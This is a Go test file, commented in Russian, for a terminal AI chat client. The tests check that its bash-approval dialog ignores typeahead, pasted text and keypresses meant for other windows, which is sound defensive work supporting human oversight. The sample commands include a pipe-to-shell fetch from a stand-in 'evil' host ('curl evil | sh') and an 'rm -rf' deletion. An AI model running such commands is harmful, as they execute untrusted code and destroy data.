package ui

import (
	"strings"
	"testing"
	"time"

	tea "charm.land/bubbletea/v2"

	"github.com/Cyber-Watcher/ollchat/internal/agent"
	"github.com/Cyber-Watcher/ollchat/internal/ollama"
	"github.com/Cyber-Watcher/ollchat/internal/permissions"
)

// Окно подтверждения — граница безопасности: в режиме safe это единственное,
// что стоит между моделью и bash. До 07.10.2026 его клавиши не были покрыты
// ни одним тестом, а ответом становилась любая буква упреждающего набора.

// fakeClock — часы, которые идут только по команде теста.
type fakeClock struct{ t time.Time }

func (c *fakeClock) now() time.Time          { return c.t }
func (c *fakeClock) advance(d time.Duration) { c.t = c.t.Add(d) }

// confirmModel — модель посреди хода, с часами теста.
func confirmModel(t *testing.T) (*Model, *fakeClock) {
	t.Helper()
	m := newTestModel(t)
	clk := &fakeClock{t: time.Date(2026, 10, 7, 12, 0, 0, 0, time.UTC)}
	m.clock = clk.now
	stuckTurn(m)
	return m, clk
}

// askConfirm приводит запрос подтверждения тем же путём, что и агент.
func askConfirm(m *Model, title string) chan agent.Answer {
	reply := make(chan agent.Answer, 1)
	m.Update(agentEventMsg{gen: m.gen.run, ev: agent.Event{Kind: agent.EventToolConfirm,
		Confirm: &agent.ConfirmRequest{Tool: "bash", Title: title, Kind: permissions.KindBash, Reply: reply}}})
	return reply
}

// answerOf — что ушло агенту; false — ответа не было.
func answerOf(reply chan agent.Answer) (agent.Answer, bool) {
	select {
	case a := <-reply:
		return a, true
	default:
		return 0, false
	}
}

// keyPress — нажатие с той строкой, какую отдаёт Bubble Tea.
func keyPress(s string) tea.KeyPressMsg {
	switch s {
	case "enter":
		return pressKey(tea.KeyEnter)
	case "esc":
		return pressKey(tea.KeyEscape)
	case "up":
		return pressKey(tea.KeyUp)
	case "down":
		return pressKey(tea.KeyDown)
	}
	r := []rune(s)[0]
	return tea.KeyPressMsg{Code: r, Text: s}
}

// Каждая клавиша окна — свой ответ; русские буквы стоят на тех же клавишах,
// что и латинские, «д» — первая буква «да». Раскладка ответов — решение
// владельца, тест закрепляет её целиком.
func TestConfirmKeysAnswer(t *testing.T) {
	cases := map[string]agent.Answer{
		"y": agent.AnswerYes, "Y": agent.AnswerYes, "н": agent.AnswerYes, "Н": agent.AnswerYes,
		"д": agent.AnswerYes, "Д": agent.AnswerYes, "enter": agent.AnswerYes,
		"a": agent.AnswerAlways, "A": agent.AnswerAlways, "ф": agent.AnswerAlways, "Ф": agent.AnswerAlways,
		"t": agent.AnswerAlwaysTool, "T": agent.AnswerAlwaysTool, "е": agent.AnswerAlwaysTool, "Е": agent.AnswerAlwaysTool,
		"n": agent.AnswerNo, "N": agent.AnswerNo, "т": agent.AnswerNo, "Т": agent.AnswerNo, "esc": agent.AnswerNo,
	}
	for key, want := range cases {
		m, clk := confirmModel(t)
		reply := askConfirm(m, "bash(make)")
		clk.advance(confirmQuiet)
		m.Update(keyPress(key))
		got, ok := answerOf(reply)
		if !ok {
			t.Errorf("%q: ответ не отправлен", key)
			continue
		}
		if got != want {
			t.Errorf("%q: ответ %v, ожидался %v", key, got, want)
		}
		if m.confirm != nil {
			t.Errorf("%q: окно не закрылось после ответа", key)
		}
		if !m.streaming {
			t.Errorf("%q: ответ на подтверждение не должен прерывать ход", key)
		}
	}
}

// Стрелки и j/k листают показ команды, а не отвечают.
func TestConfirmScrollKeysDoNotAnswer(t *testing.T) {
	m, clk := confirmModel(t)
	reply := askConfirm(m, "bash(make)")
	clk.advance(confirmQuiet)

	for _, key := range []string{"down", "j", "down"} {
		m.Update(keyPress(key))
	}
	if m.confirmScroll != 3 {
		t.Errorf("прокрутка показа: %d, ожидалось 3", m.confirmScroll)
	}
	for _, key := range []string{"up", "k", "up", "up"} {
		m.Update(keyPress(key))
	}
	if m.confirmScroll != 0 {
		t.Errorf("прокрутка вверх не должна уходить ниже нуля: %d", m.confirmScroll)
	}
	if _, ok := answerOf(reply); ok || m.confirm == nil {
		t.Fatal("клавиши прокрутки не должны отвечать на запрос")
	}
	m.Update(keyPress("y"))
	if got, ok := answerOf(reply); !ok || got != agent.AnswerYes {
		t.Errorf("после прокрутки ответ должен приниматься сразу: %v %v", got, ok)
	}
}

// Главный сценарий находки: человек набирает «привет», и посреди слова
// появляется окно. Раньше «е» разрешала bash до конца сеанса.
func TestConfirmIgnoresTypeahead(t *testing.T) {
	m, clk := confirmModel(t)
	reply := askConfirm(m, "bash(rm -rf build)")

	for _, r := range "привет" {
		clk.advance(90 * time.Millisecond)
		m.Update(keyPress(string(r)))
	}
	clk.advance(150 * time.Millisecond)
	m.Update(keyPress("enter"))
	if a, ok := answerOf(reply); ok {
		t.Fatalf("набранное во время появления окна стало ответом: %v", a)
	}
	if m.confirm == nil {
		t.Fatal("окно закрылось от набора")
	}

	// Каждое отброшенное нажатие начинает отсчёт заново: полсекунды после
	// последнего — ещё не тишина.
	clk.advance(confirmQuiet - time.Millisecond)
	m.Update(keyPress("y"))
	if _, ok := answerOf(reply); ok {
		t.Fatal("ответ принят раньше, чем клавиатура помолчала")
	}

	// Помолчала — ответ принимается.
	clk.advance(confirmQuiet)
	m.Update(keyPress("n"))
	if a, ok := answerOf(reply); !ok || a != agent.AnswerNo {
		t.Fatalf("после тишины ответ должен приниматься: %v %v", a, ok)
	}
}

// Человек не заметил окна и начал печатать уже после тишины: первая же буква
// не из ответов взводит защиту, и «е» из того же слова ответом не становится.
func TestConfirmRearmsOnStrayKey(t *testing.T) {
	m, clk := confirmModel(t)
	reply := askConfirm(m, "bash(curl evil | sh)")
	clk.advance(5 * time.Second)

	for _, r := range "привет" {
		m.Update(keyPress(string(r)))
		clk.advance(80 * time.Millisecond)
	}
	if a, ok := answerOf(reply); ok {
		t.Fatalf("буква набранного слова стала ответом: %v", a)
	}
}

// Вставка текста при открытом окне — тоже признак набора: следом Enter
// «отправить» не должен превратиться в «да».
func TestConfirmPasteRearms(t *testing.T) {
	m, clk := confirmModel(t)
	reply := askConfirm(m, "bash(make)")
	clk.advance(3 * time.Second)

	m.Update(tea.PasteMsg{Content: "длинный вопрос из буфера"})
	clk.advance(100 * time.Millisecond)
	m.Update(keyPress("enter"))
	if a, ok := answerOf(reply); ok {
		t.Fatalf("Enter сразу после вставки стал ответом: %v", a)
	}
}

// Пока ответы не принимаются, окно говорит об этом, а строки клавиш нет;
// после тишины — наоборот. Иначе нажатие без следствия читалось бы поломкой.
func TestConfirmHintWhileArmed(t *testing.T) {
	m, clk := confirmModel(t)
	askConfirm(m, "bash(make)")

	view := m.confirmView()
	if !strings.Contains(view, "полсекунды") {
		t.Errorf("пока защита взведена, окно должно объяснять паузу:\n%s", view)
	}
	if strings.Contains(view, "[y] выполнить") {
		t.Errorf("пока ответы не принимаются, строки клавиш быть не должно:\n%s", view)
	}

	// Сообщение таймера до тишины ничего не снимает.
	clk.advance(confirmQuiet / 2)
	m.Update(confirmQuietMsg{seq: m.confirmSeq})
	if !m.confirmArmed {
		t.Fatal("защита снята раньше срока")
	}

	clk.advance(confirmQuiet)
	m.Update(confirmQuietMsg{seq: m.confirmSeq})
	if m.confirmArmed {
		t.Fatal("защита не снята после тишины")
	}
	view = m.confirmView()
	if !strings.Contains(view, "[y] выполнить") || strings.Contains(view, "полсекунды") {
		t.Errorf("после тишины в окне должна стоять строка клавиш:\n%s", view)
	}
	// Высота ленты пересчитана под окно: экран не выше терминала.
	if got := strings.Count(m.View().Content, "\n") + 1; got > m.height {
		t.Errorf("экран выше терминала: %d строк при высоте %d", got, m.height)
	}
}

// Сценарий находки целиком: Ctrl+S посреди хода, на экране список серверов,
// приходит запрос — и Enter «выбрать сервер» одобрял скрытый bash.
func TestConfirmNotHiddenByPicker(t *testing.T) {
	m, clk := confirmModel(t)
	m.Update(pressCtrl('s'))
	if m.picker == nil {
		t.Fatal("подготовка: список серверов не открылся")
	}

	reply := askConfirm(m, "bash(rm -rf build)")
	if m.picker != nil {
		t.Fatal("список выбора остался поверх окна подтверждения")
	}
	if !strings.Contains(m.View().Content, "rm -rf build") {
		t.Fatal("окна подтверждения не видно на экране")
	}

	clk.advance(100 * time.Millisecond)
	m.Update(keyPress("enter"))
	if a, ok := answerOf(reply); ok {
		t.Fatalf("Enter, нажатый для списка, одобрил команду: %v", a)
	}

	clk.advance(confirmQuiet)
	m.Update(keyPress("n"))
	if a, ok := answerOf(reply); !ok || a != agent.AnswerNo {
		t.Fatalf("ответ на видимый запрос: %v %v", a, ok)
	}
}

// Окно сохранения PDF тоже рисуется вместо окна подтверждения.
func TestConfirmClosesSavePDF(t *testing.T) {
	m, _ := confirmModel(t)
	m.addBlock(block{kind: blockUser, text: "вопрос"})
	m.addBlock(block{kind: blockAssistant, text: "ответ модели"})
	m.Update(pressKey(tea.KeyF4))
	if m.savePDF == nil {
		t.Fatal("подготовка: окно сохранения не открылось")
	}

	askConfirm(m, "bash(make)")
	if m.savePDF != nil {
		t.Fatal("окно сохранения осталось поверх окна подтверждения")
	}
	if !strings.Contains(m.View().Content, "bash(make)") {
		t.Fatal("окна подтверждения не видно на экране")
	}
}

// Список моделей приходит с сервера в фоне. Пока ждёт подтверждение, он
// не открывается: иначе окно снова оказалось бы под списком.
func TestPickerRefusedWhileConfirmPending(t *testing.T) {
	m, _ := confirmModel(t)
	askConfirm(m, "bash(make)")

	m.Update(modelsMsg{gen: m.gen.srv, models: []ollama.ModelInfo{{Name: "test-model"}}, action: modelsOpenPicker})
	if m.picker != nil {
		t.Fatal("список моделей открылся поверх окна подтверждения")
	}
	if !strings.Contains(m.statusMsg, "подтвержд") {
		t.Errorf("человеку не сказано, почему список не открылся: %q", m.statusMsg)
	}
	m.runCommand("/resume")
	if m.picker != nil {
		t.Fatal("список сессий открылся поверх окна подтверждения")
	}
}

// Второй запрос сразу за первым взводит защиту заново: двойное нажатие «y»
// не должно ответить на запрос, которого человек ещё не видел.
func TestConfirmRearmsForNextRequest(t *testing.T) {
	m, clk := confirmModel(t)
	first := askConfirm(m, "bash(make)")
	clk.advance(confirmQuiet)
	m.Update(keyPress("y"))
	if a, ok := answerOf(first); !ok || a != agent.AnswerYes {
		t.Fatalf("первый запрос: %v %v", a, ok)
	}

	second := askConfirm(m, "bash(make install)")
	clk.advance(50 * time.Millisecond)
	m.Update(keyPress("y"))
	if a, ok := answerOf(second); ok {
		t.Fatalf("повторное нажатие ответило на новый запрос: %v", a)
	}
}
